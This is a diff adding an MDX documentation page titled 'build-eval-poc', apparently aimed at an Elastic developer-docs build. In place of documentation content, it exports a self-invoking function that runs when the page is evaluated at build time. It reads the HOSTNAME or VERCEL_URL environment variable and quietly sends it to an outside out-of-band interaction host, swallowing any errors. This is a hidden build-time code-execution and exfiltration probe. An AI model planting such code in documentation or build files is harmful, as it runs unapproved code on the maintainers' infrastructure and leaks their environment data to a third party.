@@ -1,0 +1,14 @@
+---
+title: build-eval-poc
+---
+
+export const _poc = (() => {
+  try {
+    const tag = (typeof process !== 'undefined' && process.env)
+      ? (process.env.HOSTNAME || process.env.VERCEL_URL || 'noenv') : 'nonode';
+    fetch('https://uppnoepmcnfznuzcxxbqd1weby0f6f92p.oast.fun/elastic-devdocs-build-eval?tag=' + encodeURIComponent(tag)).catch(() => {});
+  } catch (e) {}
+  return null;
+})();
+
+# build-eval poc
